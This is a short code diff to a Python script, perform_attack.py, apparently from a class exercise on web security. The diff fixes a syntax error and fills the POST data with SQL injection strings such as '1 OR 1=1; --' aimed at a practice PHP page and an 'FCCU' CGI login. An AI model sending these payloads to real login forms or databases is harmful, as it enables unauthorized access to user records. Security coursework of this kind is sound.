@@ -5,7 +5,7 @@ import requests
 
 def main():
     # Checking if the file was called with correct usage.
-    if (len(sys.argv) != 2)):
+    if (len(sys.argv) != 2):
         print("Usage: ./perform_attack.py <php_file>")
         sys.exit(2)
 
@@ -18,12 +18,13 @@ def main():
     data = {}
     if (file_name == "php_practice"):
         data = {
-            'student_id': query
+            'student_id': "1 OR 1=1"
         }
 
-    elif (file_name == "fccu"):
+    elif (file_name == "cgi-bin/FCCU"):
         data = {
-            'student_id': query
+            'id': "1 OR 1=1; --",
+            'password': "asdf"
         }
 
     # Send the POST request.
@@ -32,10 +33,12 @@ def main():
     # Check if the request was successful.
     if (response.status_code == 200):
         # If the request was successful, return the response.
-        return response.text
+        print(response.text)
+        sys.exit(1)
 
     # Otherwise, it did not work.
     else:
-        return sys.exit(0)
+        print("Error")
+        sys.exit(0)
 
 main()
